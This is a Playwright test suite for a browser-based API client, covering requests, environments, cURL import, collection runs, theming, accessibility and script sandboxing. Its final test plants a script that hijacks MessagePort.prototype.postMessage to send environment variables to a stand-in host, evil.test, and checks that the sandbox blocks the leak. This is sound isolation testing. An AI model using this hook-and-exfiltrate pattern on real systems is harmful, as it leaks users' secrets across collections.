import { test, expect } from '@playwright/test';
import { mockApi, openApp, axeViolations, mod, sampleCollection } from './helpers.js';

test.beforeEach(async ({ page }) => {
  await mockApi(page);
});

test('shows the alpha notice only on the first visit', async ({ page }) => {
  await page.goto('/');
  await expect(page.locator('.toast', { hasText: 'alpha' })).toBeVisible();
  await page.reload();
  await page.waitForSelector('.shell');
  await expect(page.locator('.toast', { hasText: 'alpha' })).toHaveCount(0);
});

test('sends a request and shows the response', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/items?limit=5');
  await page.getByRole('button', { name: /^Send/ }).first().click();
  await expect(page.locator('.status-pill')).toHaveText(/200 OK/);
  // The pretty printer keeps every digit of large numbers.
  await expect(page.locator('.resp-body')).toContainText('12345678901234567890');
  await expect(page.getByRole('tab', { name: /Params/ })).toContainText('1');
  // History records it.
  await page.getByRole('button', { name: 'History' }).click();
  await expect(page.locator('.history-row')).toHaveCount(1);
});

test('keeps query params and the URL in sync', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  const url = page.getByRole('combobox', { name: 'Request URL' });
  await url.fill('https://api.test/a?x=1&y=2');
  await expect(page.getByRole('combobox', { name: 'Key, row 2' })).toHaveValue('y');
  await page.getByRole('checkbox', { name: 'Enable x' }).uncheck();
  await expect(url).toHaveValue('https://api.test/a?y=2');
});

test('resolves environment variables', async ({ page }) => {
  const seen = await mockApi(page);
  await openApp(page);
  await page.getByRole('button', { name: 'New environment' }).first().click();
  await page.getByRole('dialog').getByRole('textbox').fill('Staging');
  await page.keyboard.press('Enter');
  await page.locator('table.kv tr.ghost [data-field="key"] input').first().fill('host');
  await page.locator('table.kv tr').nth(1).locator('[data-field="value"] input').fill('https://api.test');
  await page.locator('.env-select').click();
  await page.getByRole('menuitemradio', { name: 'Staging' }).click();
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('{{host}}/env-check');
  await page.keyboard.press(`${mod}+Enter`);
  await expect(page.locator('.status-pill')).toHaveText(/200/);
  expect(seen.at(-1).url).toBe('https://api.test/env-check');
});

test('runs post-response tests', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/t');
  await page.getByRole('tab', { name: 'Scripts' }).click();
  await page.getByRole('tab', { name: /Post-response/ }).click();
  const editor = page.locator('.req-panel:not([hidden]) .cm-content').last();
  await editor.click();
  await page.keyboard.insertText("test('status', () => expect(response.status).toBe(200));\ntest('wrong', () => expect(response.json().path).toBe('/nope'));");
  await page.keyboard.press(`${mod}+Enter`);
  await expect(page.getByRole('tab', { name: /Test Results/ })).toContainText('1/2');
  await page.getByRole('tab', { name: /Test Results/ }).click();
  await expect(page.locator('.test.failed')).toContainText('wrong');
});

test('fills the request from a pasted cURL command', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  const url = page.getByRole('combobox', { name: 'Request URL' });
  await url.focus();
  await page.evaluate(() => {
    const dt = new DataTransfer();
    dt.setData('text/plain', `curl -X POST https://api.test/users -H 'X-Token: abc' -d '{"a":1}'`);
    document.activeElement.dispatchEvent(new ClipboardEvent('paste', { clipboardData: dt, bubbles: true, cancelable: true }));
  });
  await expect(page.locator('.method-btn')).toContainText('POST');
  await expect(page.getByRole('combobox', { name: 'Request URL' })).toHaveValue('https://api.test/users');
  await expect(page.getByRole('tab', { name: /Headers/ })).toContainText('1');
});

test('imports a collection and runs it', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'Import' }).first().click();
  await page.getByRole('dialog').getByRole('tab', { name: /Paste/ }).click();
  await page.getByRole('dialog').locator('textarea').fill(JSON.stringify(sampleCollection));
  await page.getByRole('dialog').getByRole('button', { name: /^Import/ }).last().click();
  await expect(page.getByRole('treeitem', { name: /Sample API/ })).toBeVisible();
  await page.getByRole('treeitem', { name: /Sample API/ }).getByRole('button', { name: /Actions for/ }).click({ force: true });
  await page.getByRole('menuitem', { name: 'Run collection' }).click();
  const run = page.locator('.runner-run-btn');
  await expect(run).toBeEnabled();
  await run.click();
  await expect(page.locator('.tab-content')).toContainText('Finished', { timeout: 15000 });
  await expect(page.locator('.tab-content')).toContainText(/2\s*passed/);
  // Nothing failed, so there is nothing to rerun.
  await expect(page.getByRole('button', { name: 'Rerun failed' })).toBeHidden();
});

test('offers Beautify only for raw body types it can format', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('tab', { name: /Body/ }).click();
  await page.getByRole('radio', { name: 'raw' }).check();
  await page.getByRole('combobox', { name: 'Raw body type' }).selectOption('json');
  await expect(page.getByRole('button', { name: 'Beautify' })).toBeVisible();
  await page.getByRole('combobox', { name: 'Raw body type' }).selectOption('text');
  await expect(page.getByRole('button', { name: 'Beautify' })).toBeHidden();
});

test('previews HTML without running its scripts', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/html');
  await page.keyboard.press(`${mod}+Enter`);
  await page.getByRole('radio', { name: 'Preview' }).click();
  const frame = page.frameLocator('iframe.resp-frame');
  await expect(frame.locator('h1')).toHaveText('Hello');
  expect(await page.evaluate(() => window.hacked)).toBeUndefined();
});

test('saves a request to a new collection', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/save');
  await page.keyboard.press(`${mod}+s`);
  const dialog = page.getByRole('dialog');
  await dialog.getByLabel('Request name').fill('Saved one');
  await dialog.getByRole('button', { name: 'Save' }).click();
  await expect(page.getByRole('treeitem', { name: /Saved one/ })).toBeVisible();
  await page.reload();
  await expect(page.getByRole('treeitem', { name: /Saved one/ })).toBeVisible();
});

test('switches themes', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'Theme' }).click();
  await page.getByRole('menuitemradio', { name: 'Dark' }).click();
  await expect(page.locator('html')).toHaveAttribute('data-theme-resolved', 'dark');
  await page.reload();
  await expect(page.locator('html')).toHaveAttribute('data-theme-resolved', 'dark');
});

test('has no accessibility violations on the main screens', async ({ page }) => {
  await openApp(page);
  expect(await axeViolations(page)).toEqual([]);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/a11y');
  await page.keyboard.press(`${mod}+Enter`);
  await expect(page.locator('.status-pill')).toBeVisible();
  expect(await axeViolations(page)).toEqual([]);
});

test('switches between request and response on phones @mobile', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/m');
  await page.getByRole('button', { name: /^Send/ }).first().click();
  await expect(page.locator('.status-pill')).toBeVisible();
  await expect(page.getByRole('radio', { name: 'Response' })).toHaveAttribute('aria-checked', 'true');
  await page.getByRole('radio', { name: 'Request' }).click();
  await expect(page.getByRole('tab', { name: /Params/ })).toBeVisible();
  expect(await axeViolations(page)).toEqual([]);
});

test('filters JSON responses with a path', async ({ page }) => {
  await openApp(page);
  await page.getByRole('button', { name: 'New request' }).first().click();
  await page.getByRole('combobox', { name: 'Request URL' }).fill('https://api.test/items?a=1&b=2');
  await page.keyboard.press(`${mod}+Enter`);
  await expect(page.locator('.status-pill')).toBeVisible();
  await page.getByRole('button', { name: 'Filter with a JSON path' }).click();
  await page.getByRole('textbox', { name: 'JSON path' }).fill('$.query.b');
  await expect(page.locator('.resp-filter-msg')).toHaveText('1 match');
  await expect(page.locator('.resp-body .cm-content')).toHaveText('"2"');
});

test('runs each script in a fresh realm when the browser cannot give scripts a worker', async ({ page }) => {
  // The sandbox iframe has an opaque origin: take Worker away there only, so scripts run inline.
  await page.addInitScript(() => {
    if (self.origin === 'null') self.Worker = function Worker() { throw new Error('no workers here'); };
  });
  await openApp(page);
  const out = await page.evaluate(async () => {
    const { ScriptSandbox } = await import('/src/core/scripts/sandbox.js');
    const sends = [];
    const sandbox = new ScriptSandbox({ onSend: async (r) => (sends.push(r.url), { status: 200, headers: [], bodyText: '' }) });
    const run = (code, environment = {}) => sandbox.run({ phase: 'pre', code, request: { method: 'GET', url: 'https://x.test', headers: [], body: { mode: 'none', raw: '' } }, variables: { environment, collection: {}, globals: {}, local: {} }, info: {} });
    // A script from one collection leaves hooks behind...
    await run(`
      globalThis.leftBehind = 'yes';
      const post = MessagePort.prototype.postMessage;
      MessagePort.prototype.postMessage = function (m, ...rest) {
        if (m?.type === 'result') post.call(this, { type: 'send', id: m.id, sendId: 99, request: { method: 'GET', url: 'https://evil.test/?' + JSON.stringify(m.result.variables), headers: [], body: { mode: 'none', raw: '' } } });
        return post.call(this, m, ...rest);
      };
    `);
    // ...which must not see a later run with another collection's secrets.
    const later = await run(`console.log(typeof globalThis.leftBehind)`, { token: 'SECRET' });
    await new Promise((r) => setTimeout(r, 300));
    const mode = sandbox.mode;
    sandbox.dispose();
    return { mode, ok: later.ok, logs: later.logs.map((l) => l.args.join(' ')), sends };
  });
  expect(out.mode).toBe('inline');
  expect(out.ok).toBe(true);
  expect(out.logs).toEqual(['undefined']);
  // The first script can only report on its own run.
  expect(out.sends.join(' ')).not.toContain('SECRET');
});
